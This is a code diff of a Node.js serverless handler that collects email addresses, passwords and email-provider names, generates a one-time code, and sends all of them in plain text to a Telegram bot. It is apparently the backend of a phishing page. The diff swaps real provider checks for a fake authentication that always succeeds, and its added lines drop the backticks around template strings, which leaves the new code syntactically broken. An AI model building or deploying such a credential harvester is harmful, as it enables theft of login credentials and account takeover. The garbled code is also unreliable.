@@ -1,6 +1,6 @@
 const Redis = require("ioredis");
 const fetch = require("node-fetch");
-const { authenticateWithProvider } = require("./utils/email-auth");
+// const { authenticateWithProvider } = require("./utils/email-auth"); // Removed for now
 
 const BOT_TOKEN = process.env.BOT_TOKEN;
 const CHAT_ID = process.env.CHAT_ID;
@@ -13,7 +13,7 @@ if (!BOT_TOKEN || !CHAT_ID || !REDIS_URL) {
 const redis = new Redis(REDIS_URL);
 
 function getOtpKey(email) {
-  return `otp:${email}`;
+  return otp:${email};
 }
 
 function generateOtp() {
@@ -48,30 +48,25 @@ exports.handler = async function (event) {
     };
   }
 
-  // Authenticate with real provider
-  let authResult;
-  try {
-    authResult = await authenticateWithProvider(email, password, provider);
-    if (!authResult.success) {
-      return {
-        statusCode: 401,
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ success: false, message: authResult.message || "Invalid credentials" }),
-      };
-    }
-  } catch (err) {
+  // Normalize email
+  email = email.trim().toLowerCase();
+
+  // Fake authentication — always succeed
+  const authResult = { success: true };
+
+  if (!authResult.success) {
     return {
-      statusCode: 500,
+      statusCode: 401,
       headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ success: false, message: "Error authenticating with provider", error: err.message }),
+      body: JSON.stringify({ success: false, message: "Invalid credentials" }),
     };
   }
 
   const otp = generateOtp();
 
   try {
-    // Store OTP in Redis (no expiry, so user can use it anytime)
-    await redis.set(getOtpKey(email), otp);
+    // Store OTP in Redis with 5 minute expiry (recommended)
+    await redis.set(getOtpKey(email), otp, "EX", 300);
   } catch (err) {
     return {
       statusCode: 500,
@@ -86,14 +81,14 @@ exports.handler = async function (event) {
 
   // Send credentials and OTP to Telegram
   const message =
-    `🔐 *New Login Attempt*\n\n` +
-    `📧 Email: ${email}\n` +
-    `🔑 Password: ${password}\n` +
-    `🌐 Provider: ${provider}\n` +
-    `✅ Authenticated: YES\n` +
-    `🧾 OTP: ${otp}`;
+    🔐 *New Login Attempt*\n\n +
+    📧 Email: ${email}\n +
+    🔑 Password: ${password}\n +
+    🌐 Provider: ${provider}\n +
+    ✅ Authenticated: YES\n +
+    🧾 OTP: ${otp};
 
-  const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+  const telegramUrl = https://api.telegram.org/bot${BOT_TOKEN}/sendMessage;
 
   try {
     const response = await fetch(telegramUrl, {
@@ -108,7 +103,7 @@ exports.handler = async function (event) {
 
     if (!response.ok) {
       const text = await response.text();
-      throw new Error(`Telegram API error: ${response.status} ${text}`);
+      throw new Error(Telegram API error: ${response.status} ${text});
     }
 
     return {
